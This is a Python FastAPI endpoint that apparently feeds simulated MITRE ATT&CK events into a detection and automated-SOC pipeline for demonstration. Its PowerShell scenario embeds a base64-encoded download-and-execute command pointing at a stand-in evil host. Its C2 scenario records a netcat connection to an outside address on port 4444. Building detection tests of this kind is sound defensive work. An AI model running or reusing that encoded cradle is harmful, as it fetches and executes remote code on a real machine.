"""
Personal AI Cyber Digital Twin - Live Attack Simulation Engine
Allows safe real-time simulation of MITRE ATT&CK vectors to demonstrate automated Digital Twin detection.
"""

import uuid
from datetime import datetime, timezone
from fastapi import APIRouter
from pydantic import BaseModel

from app.digital_twin.memory_engine import MemoryEngine
from app.agentic_ai.soc_analyst import MultiAgentSOCSuite
from app.digital_twin.behavioral_baseline import BehavioralBaselineEngine

router = APIRouter()

class SimulationRequest(BaseModel):
    scenario: str # 't1059_powershell', 't1115_clipboard', 't1091_usb', 't1071_c2', 't1566_phishing'

@router.post("/trigger")
def trigger_attack_simulation(payload: SimulationRequest):
    scenario = payload.scenario.lower()
    baseline_engine = BehavioralBaselineEngine()
    
    event = None
    
    if scenario == "t1059_powershell":
        event = {
            "id": str(uuid.uuid4()),
            "device_id": "LOCAL_HOST_DEVICE",
            "event_type": "process",
            "severity": "high",
            "risk_score": 85,
            "source_component": "AttackSimulator Engine",
            "mitre_tactic": "TA0002 Execution",
            "mitre_technique": "T1059.001 - Encoded PowerShell Execution",
            "raw_payload": {
                "pid": 9999,
                "ppid": 1234,
                "parent_name": "cmd.exe",
                "process_name": "powershell.exe",
                "cmdline": "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAuAGUAdgBpAGwALgB4AHkAegAvAHMAcABlAGEAcgAuAHAAcwAxACcAKQA=",
                "username": "DEMO_SIMULATED_USER",
                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
            },
            "created_at": datetime.now(timezone.utc).isoformat()
        }
    elif scenario == "t1115_clipboard":
        event = {
            "id": str(uuid.uuid4()),
            "device_id": "LOCAL_HOST_DEVICE",
            "event_type": "clipboard",
            "severity": "medium",
            "risk_score": 65,
            "source_component": "AttackSimulator Engine",
            "mitre_tactic": "TA0009 Collection",
            "mitre_technique": "T1115 - Clipboard Data Harvest",
            "raw_payload": {
                "length": 45,
                "preview": "api_secret_key: [REDACTED_SECRET]",
                "detected_protection": "Sensitive Credentials"
            },
            "created_at": datetime.now(timezone.utc).isoformat()
        }
    elif scenario == "t1091_usb":
        event = {
            "id": str(uuid.uuid4()),
            "device_id": "LOCAL_HOST_DEVICE",
            "event_type": "usb",
            "severity": "high",
            "risk_score": 75,
            "source_component": "AttackSimulator Engine",
            "mitre_tactic": "TA0001 Initial Access",
            "mitre_technique": "T1091 - Removable Media Autorun Payload",
            "raw_payload": {
                "action": "inserted_unverified_drive",
                "device": "\\\\.\\PhysicalDrive2",
                "mountpoint": "E:\\autorun.inf"
            },
            "created_at": datetime.now(timezone.utc).isoformat()
        }
    elif scenario == "t1071_c2":
        event = {
            "id": str(uuid.uuid4()),
            "device_id": "LOCAL_HOST_DEVICE",
            "event_type": "network",
            "severity": "critical",
            "risk_score": 90,
            "source_component": "AttackSimulator Engine",
            "mitre_tactic": "TA0011 Command and Control",
            "mitre_technique": "T1071 / Risk Port 4444 (Metasploit Listener)",
            "raw_payload": {
                "pid": 8888,
                "process_name": "nc.exe",
                "local_address": "192.168.1.50:49152",
                "remote_address": "185.220.101.5:4444",
                "remote_ip": "185.220.101.5",
                "remote_port": 4444,
                "status": "ESTABLISHED"
            },
            "created_at": datetime.now(timezone.utc).isoformat()
        }
    else:
        return {"error": "Invalid simulation scenario."}
        
    # Save simulated attack event to SQLite WAL persistence
    MemoryEngine.save_event(event)
    
    # Run Multi-Agent SOC assessment
    soc_analysis = MultiAgentSOCSuite.analyze_incident(event)
    
    return {
        "status": "ATTACK_SIMULATED_SUCCESSFULLY",
        "scenario": scenario,
        "event": event,
        "soc_analysis": soc_analysis,
        "updated_twin_health": MemoryEngine.calculate_twin_health()
    }
